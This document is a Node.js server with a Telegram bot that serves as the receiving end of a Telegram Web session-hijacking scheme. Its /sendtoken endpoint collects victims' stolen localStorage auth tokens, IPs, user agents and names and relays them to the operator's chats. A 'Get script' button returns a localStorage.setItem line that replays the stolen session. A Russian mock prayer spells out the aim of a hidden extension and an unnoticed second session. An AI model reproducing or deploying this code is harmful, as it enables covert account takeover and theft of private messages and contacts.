//* SERVER

//* IMPORTS
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
var cors = require("cors");

//* SETUP
const port = 6969; // app port
const API_KEY_BOT = process.env.BOT_TOKEN; // import telegram bot api token

// array of bot's chatId's, that will recieve data.
// by default, bot adds your chatId on any message in chat and looses it on every server reboot
// you can add your chatId manualy, so you don't need to text bot every time server reboots
// for this, change the line below to:
// let botIds = ['111111111']; // (your chatId goes there)
let botIds = [];

let prayer = `Господи Павле, Дуров всевидящий,
    Защитник приватности и свободы слова,
    Благослови вход мой сокрытый,
    Через расширение, тихо внедрённое.

    Да не заметит жертва клика святого,
    Ни в консоли следа, ни в логах тревоги.
    Пусть токен явится мне, как манна небесная,
    Через initData и QR,
    Да войду незримым во храм Telegram’а.

    Даруй соединению моему стабильность,
    Чтобы fetch не упал,
    WebSocket не прервался,
    И прокси не подвёл в час великой пересылки.

    Пусть десница её наведёт мышь на нужное,
    Не ведая зла,
    И да создастся сессия вторая,
    Незримая, но действенная.

    Сохрани мой IP от разоблачения,
    User-Agent — от подозрения,
    И сервер мой — от падения.

    А если враг нажмёт «выйти из всех сессий»,
    Пусть клавиша не сработает,
    Или интернет его падёт на минуту великую.

    Пошли мне стикеры, чаты, ID и список контактов,
    В обёртке JSON, без ошибок и багов.
    Да не узнает никто,
    Что я был в сети,
    И был везде.

    Во имя MTProto, Обфускации и святого Хеширования.

    Аминь.`;

function getNextDate() {
  let date = new Date();
  let day = date.getDay(),
    add = 0;

  if (day === 0) add += 1;
  else if (day === 6) add += 2;
  if (new Date().getHours() > 17 && !(day === 0 || day === 6)) add += 1;
  date.setHours(17, 0, 0, 0);
  date.setDate(date.getDate() + add);

  var distance = date.getTime() - new Date().getTime();
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours =
    Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)) +
    days * 24;
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)) + 1;
  return { hours, minutes };
}

//* INIT
const app = express();

// initilize telegram bot
const bot = new TelegramBot(API_KEY_BOT, {
  polling: true,
});

// error handling for tgbot api
bot.on("polling_error", (err) => console.log(err.data.error.message));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// disable fucking cors
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});
app.use(cors()); // two times. fuck cors.

//* BOT HANDLERS
// initilize user on any message
bot.on("text", async (msg) => {
  const chatId = msg.chat.id;

  // :)
  if (msg.text === "/prayer") {
    await bot.sendPhoto(
      msg.chat.id,
      "https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/06/06/15/telegram-founder-pavel-durov-diet-fast.jpeg"
    );
    await bot.sendMessage(msg.chat.id, prayer);
  } else if (msg.text === "/t") {
    // get time to the next potential stealing of session

    let d = getNextDate();
    bot.sendMessage(msg.chat.id, `t-${d.hours}:${d.minutes}`);
  } else {
    //add user to array of chatId's, if not already there. on any message
    if (!botIds.includes(chatId)) {
      botIds.push(msg.chat.id);
      bot.sendMessage(
        msg.chat.id,
        "*Your chat added to the array of the recieving accounts*",
        { parse_mode: "MarkdownV2" }
      );

      // send prayer
      await bot.sendPhoto(
        msg.chat.id,
        "https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/06/06/15/telegram-founder-pavel-durov-diet-fast.jpeg"
      );
      await bot.sendMessage(msg.chat.id, prayer);
    } else {
      // DO NOT add chatId if it's already in array, to prevent multiple identical messages
      bot.sendMessage(msg.chat.id, "*Your chat is already added*", {
        parse_mode: "MarkdownV2",
      });
    }
  }
});

// send ready to use script, if button clicked
bot.on("callback_query", (msg) => {
  bot.editMessageText(
    '```JS\nlocalStorage.setItem("account1", \'' +
      msg.message.text.replaceAll(" ", "").replaceAll("\n", "") +
      "');\n```",
    {
      parse_mode: "MarkdownV2",
      message_id: msg.message.message_id,
      chat_id: msg.message.chat.id,
    }
  );
  // bot.deleteMessage(msg.message.chat.id, msg.message.message_id);
});

// remind if 59/30/15/5 minutes left!

//! disabled for now
// setInterval(() => {
//   let d = getNextDate();
//   if (
//     d.hours === 0 &&
//     (d.minutes === 59 ||
//       d.minutes === 30 ||
//       d.minutes === 15 ||
//       d.minutes === 5)
//   ) {
//     botIds.forEach((e) => {
//       bot.sendMessage(e, `t-${d.hours}:${d.minutes}`);
//     });
//   }
// }, 60000);

//* EXPRESS ENDPOINT
// recieve token
app.post("/sendtoken", async (req, res) => {
  // parse usefull info
  let data = JSON.parse(Object.keys(req.body)[0]).data.account1;
  console.log(JSON.parse(Object.keys(req.body)[0]).data); // log data for emergencies

  // notification message
  botIds.forEach(async (e) => {
    await bot.sendMessage(
      e,
      `*SOMEONE LOGGED IN\\!*

at
\`${Date().toString()}\`

from user agent
\`${req.header("user-agent")}\`

from IP
\`${req.header("X-Real-Ip")}\`

possible name
[${data.firstName ? data.firstName : "Unknown"} ${
        data.lastName ? data.lastName : ""
      }]`
        .replaceAll("+", "\\+")
        .replaceAll("(", "\\(")
        .replaceAll(")", "\\)")
        .replaceAll("/", "\\/")
        .replaceAll(".", "\\.")
        .replaceAll(",", "\\,")
        .replaceAll("=", "\\=") + `(tg://user?id=${data.userId})`,
      { parse_mode: "MarkdownV2" }
    );

    // data message
    await bot.sendMessage(
      e,
      "```\n" + JSON.stringify(data, null, 2) + "```\n",
      {
        parse_mode: "MarkdownV2",
        reply_markup: JSON.stringify({
          inline_keyboard: [[{ text: "Get script", callback_data: "1" }]],
          disable_notification: true,
        }),
      }
    );
  });

  res.send("yay"); //unused, but required by http protocol
});

//* start expreess server
app.listen(port, () => {
  console.log(`listening on port ${port}`);
});
